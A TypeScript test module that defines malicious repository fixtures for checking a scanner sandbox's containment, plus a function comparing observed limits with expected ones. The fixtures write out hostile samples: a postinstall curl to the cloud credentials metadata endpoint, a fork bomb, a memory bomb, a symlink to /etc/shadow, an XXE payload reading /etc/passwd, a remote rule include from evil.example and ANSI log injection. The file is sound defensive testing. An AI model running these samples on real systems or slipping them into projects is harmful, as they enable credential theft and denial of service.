/**
 * Hostile-repository corpus.
 *
 * The sandbox is the only place untrusted code runs, so its guarantees must be
 * tested the same way we test any other code: with fixtures that *try* to break
 * out. Each fixture declares what containment we expect, and CI fails if the
 * sandbox lets any of it through.
 *
 * `threatIds` map to entries in docs/architecture/THREAT-MODEL.md.
 */

export interface ContainmentExpectation {
  /** Must be zero. Any egress byte is a defect. */
  maxEgressBytes: number;
  maxMemoryMb: number;
  maxWallClockMs: number;
  maxPids: number;
  /** Writes outside the scratch tmpfs must be blocked by the read-only rootfs. */
  allowWritesOutsideWorkdir: boolean;
}

export interface MaliciousFixture {
  id: string;
  description: string;
  threatIds: string[];
  /** Files the fixture writes into the repository before it is scanned. */
  files: Record<string, string>;
  expectation: ContainmentExpectation;
}

const BASELINE: ContainmentExpectation = {
  maxEgressBytes: 0,
  maxMemoryMb: 2048,
  maxWallClockMs: 600_000,
  maxPids: 256,
  allowWritesOutsideWorkdir: false,
};

export const MALICIOUS_FIXTURES: readonly MaliciousFixture[] = [
  {
    id: 'postinstall-exfil',
    description:
      'npm lifecycle script that tries to read the cloud metadata service and POST the result away.',
    threatIds: ['T3', 'T5'],
    files: {
      'package.json': JSON.stringify({
        name: 'hostile-postinstall',
        version: '1.0.0',
        scripts: {
          postinstall:
            'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ || true',
        },
      }),
    },
    expectation: BASELINE,
  },
  {
    id: 'fork-bomb',
    description: 'Shell fork bomb designed to exhaust the PID namespace.',
    threatIds: ['T2'],
    files: { 'bomb.sh': ':(){ :|:& };:\n' },
    expectation: { ...BASELINE, maxPids: 256 },
  },
  {
    id: 'memory-bomb',
    description: 'Allocates memory in a tight loop until the cgroup limit is enforced.',
    threatIds: ['T2'],
    files: {
      'hog.js': 'const a=[];while(true){a.push(Buffer.alloc(64*1024*1024));}\n',
    },
    expectation: { ...BASELINE, maxMemoryMb: 2048 },
  },
  {
    id: 'path-traversal-archive',
    description: 'Tarball containing ../ entries that would escape the extraction root.',
    threatIds: ['T7'],
    files: { 'notes.txt': 'see ../../../../etc/passwd\n' },
    expectation: BASELINE,
  },
  {
    id: 'symlink-escape',
    description: 'Symlink pointing at the host filesystem through the mounted source tree.',
    threatIds: ['T7'],
    files: { 'escape.link': '/etc/shadow' },
    expectation: BASELINE,
  },
  {
    id: 'remote-rule-config',
    description:
      'Repository ships a scanner config that instructs the tool to fetch rules from the internet.',
    threatIds: ['T11'],
    files: {
      '.semgrep.yml': 'rules: []\ninclude:\n  - https://evil.example/rules.yaml\n',
    },
    expectation: { ...BASELINE, maxEgressBytes: 0 },
  },
  {
    id: 'xxe-sarif',
    description: 'Malformed SARIF/XML designed to trigger external entity expansion in the parser.',
    threatIds: ['T8'],
    files: {
      'report.sarif':
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    },
    expectation: BASELINE,
  },
  {
    id: 'ansi-log-injection',
    description: 'Control characters and fake log lines embedded in a scanner message.',
    threatIds: ['T9'],
    files: { 'evil.ts': 'const x = "\\u001b[31mFAKE ALERT\\u0007";\n' },
    expectation: BASELINE,
  },
];

export interface ObservedContainment {
  egressBytes: number;
  peakMemoryMb: number;
  wallClockMs: number;
  peakPids: number;
  wroteOutsideWorkdir: boolean;
}

export interface ContainmentVerdict {
  passed: boolean;
  violations: string[];
}

/**
 * Compares what the sandbox actually allowed against what the fixture demands.
 * Used by the `malicious-repo-tests` workflow.
 */
export function assertContainment(
  fixture: MaliciousFixture,
  observed: ObservedContainment,
): ContainmentVerdict {
  const violations: string[] = [];
  const { expectation } = fixture;

  if (observed.egressBytes > expectation.maxEgressBytes) {
    violations.push(
      `egress: ${observed.egressBytes} bytes observed, expected <= ${expectation.maxEgressBytes}`,
    );
  }
  if (observed.peakMemoryMb > expectation.maxMemoryMb) {
    violations.push(
      `memory: ${observed.peakMemoryMb} MB observed, expected <= ${expectation.maxMemoryMb} MB`,
    );
  }
  if (observed.wallClockMs > expectation.maxWallClockMs) {
    violations.push(
      `wall clock: ${observed.wallClockMs} ms observed, expected <= ${expectation.maxWallClockMs} ms`,
    );
  }
  if (observed.peakPids > expectation.maxPids) {
    violations.push(`pids: ${observed.peakPids} observed, expected <= ${expectation.maxPids}`);
  }
  if (observed.wroteOutsideWorkdir && !expectation.allowWritesOutsideWorkdir) {
    violations.push('wrote outside the scratch working directory');
  }

  return { passed: violations.length === 0, violations };
}

export function fixtureById(id: string): MaliciousFixture | undefined {
  return MALICIOUS_FIXTURES.find((fixture) => fixture.id === id);
}
